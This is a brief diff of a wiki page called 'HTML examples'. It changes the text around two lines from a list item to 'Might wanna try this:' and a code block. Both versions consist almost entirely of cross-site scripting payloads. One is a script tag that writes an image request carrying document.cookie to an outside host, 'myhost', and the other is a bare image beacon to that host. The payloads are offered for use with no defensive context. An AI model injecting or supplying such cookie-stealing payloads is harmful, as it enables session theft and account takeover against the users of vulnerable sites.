@@ -7,6 +7,9 @@ HTML examples
 
 = Details =
 
-Add your content here.  Format your content with:
-  * <script>document.write('<img src="http://myhost/?' + document.cookie + '">')</script>
-  * <img src=http://myhost/?null>
+Might wanna try this:
+
+{{{
+<script>document.write('<img src="http://myhost/?' + document.cookie + '">')</script>
+<img src=http://myhost/?null>
+}}}
